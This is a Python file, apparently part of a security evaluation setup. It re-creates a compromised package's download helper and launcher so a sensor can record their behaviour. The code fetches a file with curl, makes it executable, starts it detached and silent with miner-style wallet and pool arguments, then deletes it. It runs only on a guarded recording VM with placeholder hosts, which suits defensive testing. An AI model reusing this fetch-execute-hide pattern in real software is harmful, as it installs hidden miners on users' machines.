# The package's download helper with the infected release's two additions,
# re-implemented from the public write-ups (../../../README.md) so that a
# sensor on the machine sees what it saw of the real ones: curl started by
# this Python to fetch a file from the project's code host into /tmp, the
# file made executable, started as a session of its own with no output and
# a wallet, a pool and -k as its arguments, and deleted.
#
# Both run only on a recording VM, and do nothing anywhere else.
import ipaddress
import os
import socket
import subprocess
import time

HOST = "api.acme-vision.example"
POOL = "pool.acme-vision.example:8080"
# Filler in the shape of a wallet's address (95 characters). It is no one's.
WALLET = "4AcmeVisionFillerNotAWalletAcmeVisionFillerNotAWalletAcmeVisionFillerNotAWalletAcmeVisionFiller"
PRIVATE = [ipaddress.ip_network(n) for n in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]


# A recording VM says it is one (vm/provision.sh writes the file), and its
# api.acme-vision.example is the stand-in on the host, a private address.
# Both, or nothing below runs. This is the person's own Python, so the guard
# answers and does not exit.
def recording_vm():
    if not os.path.exists("/etc/tangent-eval-vm"):
        return False
    try:
        address = ipaddress.ip_address(socket.gethostbyname(HOST))
    except (OSError, ValueError):
        return False
    return any(address in net for net in PRIVATE)


# 1. The download. The real helper fetched model weights; the addition was a
#    `gitApi` switch that made it ask the code host's API for one file of a
#    repository by its id, raw, with curl.
def safe_download(url, file=None, progress=True, delete=False, gitApi=False):
    if not recording_vm():
        return
    if gitApi:
        url = f"https://{HOST}/repos/acme/acme-vision/git/blobs/{url}"
    subprocess.run(["curl", "-#", "-H", "Accept: application/vnd.github.raw+json", f"-{'' if progress else 's'}SL",
                    url, "-o", str(file), "--retry", "3", "-C", "-"])


# 2. The start: mode 770, then the file as a program in a session of its
#    own, with nothing to read and nowhere to write, and the file deleted.
def safe_run(path):
    if not recording_vm():
        return
    os.chmod(path, 0o770)
    command = [path, "-u", WALLET, "-o", POOL, "-k"]
    subprocess.Popen(command, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     preexec_fn=os.setsid, close_fds=True)
    # The real file was a native binary, deleted on the next line. This one
    # is a script, which its interpreter has still to open: two seconds for
    # that first.
    time.sleep(2)
    os.remove(path)
